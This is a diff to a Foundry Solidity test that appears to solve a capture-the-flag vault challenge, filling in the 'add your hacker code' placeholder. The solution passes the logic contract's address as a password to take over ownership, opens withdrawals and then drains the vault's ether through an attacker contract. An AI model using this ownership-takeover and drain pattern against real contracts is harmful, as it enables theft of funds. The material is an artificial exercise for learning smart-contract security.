@@ -2,6 +2,7 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
+import {Script, console} from "forge-std/Script.sol";
 import "../src/Vault.sol";
 import "../src/Attacker.sol";
 
@@ -19,22 +20,27 @@ contract VaultExploiter is Test {
         vm.startPrank(owner);
         logic = new VaultLogic(bytes32("0x1234"));
         vault = new Vault(address(logic));
-
         vault.deposite{value: 0.1 ether}();
-        vault.openWithdraw();
+
         vm.stopPrank();
 
         vm.startPrank(palyer);
-
         attacker = new Attacker(address(vault), palyer);
         vm.stopPrank();
     }
 
     function testExploit() public {
-        vm.deal(palyer, 1 ether);
-        vm.startPrank(palyer);
+        vm.deal(palyer, 0.1 ether);
 
-        // add your hacker code.
+        vm.startPrank(palyer);
+        // change owner to player
+        bytes32 password = bytes32(uint256(uint160(address(logic))));
+        console.logBytes32(password);
+        console.log("callChangeOwner before");
+        attacker.callChangeOwner(password, palyer);
+
+        vault.openWithdraw();
+        // transfer balance to player
         attacker.attack{value: 0.1 ether}();
 
         require(vault.isSolve(), "solved");
